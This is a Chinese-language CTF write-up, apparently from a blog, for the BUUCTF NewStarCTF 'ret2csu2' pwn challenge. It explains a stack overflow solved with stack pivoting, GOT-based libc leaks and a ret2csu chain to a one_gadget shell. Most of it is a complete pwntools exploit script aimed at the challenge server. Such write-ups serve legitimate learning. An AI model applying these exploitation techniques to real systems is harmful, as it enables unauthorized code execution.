---
title: BUUCTF-NewStarCTF-ret2csu2 题解
date: 2026-02-06 12:22:00
tags: 
    - pwn
    - stack
    - BUUCTF
categories: BUUCTF 题解
---
### 题目

[题目链接](https://buuoj.cn/challenges#[NewStarCTF%20%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93]ret2csu2)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-ret2csu2/checksec.png)

没有 canary 和 pie 但开了 Full RELRO ，要注意 .got 的只读属性

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-ret2csu2/main.png)

存在栈溢出，溢出长度较小，考虑栈迁移

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-ret2csu2/hello.png)

![这是什么鸭](https://pic.ratherhard.com/post/BUUCTF/NewStarCTF-ret2csu2/csu.png)

### 攻击思路

栈迁移即可， leak 出 libc 基址后，利用 csu 构造 rop 链时考虑使用栈拼接的技巧

### exp

```python
from pwn import *
from onegadget_selector import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libcoffsetdict = {}
libcrealdict = {}

def libcdict_add(name, addr):
	if addr > 0x1000000:
		libcrealdict[name] = addr
		addr %= 0x1000
	libcoffsetdict[name] = addr

def getlibc(path):
	if not debug:
		return ELF(libcdb.search_by_symbol_offsets(libcoffsetdict))
	else:
		return ELF(path)

def initlibc(libc):
	if not debug:
		subprocess.run(['cp', libc.path, './libc.so.6'])
		subprocess.run(['pwninit', '--no-template'])

debug = 1

if debug:
	p = process('./pwn_patched')
else:
	p = remote('node5.buuoj.cn', 27493)

csuaddr = 0x40075C
itaddr = 0x4007A8
hellorbp = 0x601108
ret2read = 0x4006D6
ret2write = 0x4006B7
fakerbp = 0x601208

def pleaker(addr):
	sleep(0.1)
	payload = (p64(addr)).ljust(240, b'A') + p64(hellorbp) + p64(ret2write)
	p.send(payload)
	retaddr = u64(p.recv(8))
	p.recvn(0x36 - 0x8, 1)
	return retaddr
	
def attack():
	payload = b'A' * 240 + p64(hellorbp) + p64(ret2read)
	p.sendafter(b'it!\n', payload)
	libcdict_add('__libc_start_main', pleaker(0x600FF0))
	libcdict_add('mprotect', pleaker(0x600FE8))
	libcdict_add('setvbuf', pleaker(0x600FE0))
	libc = getlibc('./libc.so.6')
	base_addr = libcrealdict['__libc_start_main'] - libc.symbols['__libc_start_main']
	log.info(f'base_addr = {hex(base_addr)}')
	initlibc(libc)
	one_gadget_offset = select_onegadgets(libc.path)
	one_gadget_addr = base_addr + one_gadget_offset
	sleep(0.1)
	payload = (p64(itaddr)).ljust(240, b'A') + p64(fakerbp) + p64(ret2write)
	p.send(payload)
	payload = (p64(0) + p64(0) + p64(0) + p64(0) + p64(one_gadget_addr)).ljust(240, b'A') + p64(hellorbp) + p64(ret2write)
	p.sendafter(b'it!\n', payload)
	payload = (p64(itaddr)).ljust(240, b'A') + p64(hellorbp) + p64(csuaddr)
	p.sendafter(b'it!\n', payload)
	p.interactive()

attack()
```